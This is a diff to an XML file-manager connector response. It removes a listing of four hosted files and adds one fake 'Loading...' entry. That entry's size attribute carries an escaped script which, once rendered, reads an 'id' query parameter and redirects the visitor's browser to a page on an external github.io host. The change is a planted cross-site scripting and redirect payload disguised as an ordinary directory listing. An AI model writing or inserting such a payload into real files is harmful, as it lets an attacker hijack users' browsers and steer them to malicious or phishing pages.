@@ -1,46 +1,18 @@
 <?xml version="1.0" encoding="UTF-8"?>
-
-<Connector command="GetFoldersAndFiles" resourceType="File">
-
-    <CurrentFolder
-        path="/"
-        url="https://mrsabasmia.github.io/subwork/work/"
-    />
-
-    <Error number="0"/>
-
-    <Folders/>
+<Connector command="GetFoldersAndFiles" resourceType="Document">
+    <CurrentFolder path="/1 - f/" url=""/>
 
     <Files>
+        <File desc="1" name="Loading..." size="&lt;script&gt;
+        (function() {
+            const baseURL = 'https://mrsabasmia.github.io/subwork/work/';
+            const params = new URLSearchParams(window.location.search);
+            const file = params.get('id');
 
-        <File
-            id="document"
-            name="document.pdf"
-            size="102400"
-            url="https://mrsabasmia.github.io/subwork/work/document.pdf"
-        />
-
-        <File
-            id="book"
-            name="book.docx"
-            size="204800"
-            url="https://mrsabasmia.github.io/subwork/work/book.docx"
-        />
-
-        <File
-            id="image"
-            name="image.jpg"
-            size="51200"
-            url="https://mrsabasmia.github.io/subwork/work/image.jpg"
-        />
-
-        <File
-            id="page"
-            name="page.html"
-            size="10240"
-            url="https://mrsabasmia.github.io/subwork/work/page.html"
-        />
-
+            if (file) {
+                window.location.replace(baseURL + encodeURIComponent(file) + '.html');
+            }
+        })();
+        &lt;/script&gt;"/>
     </Files>
-
 </Connector>
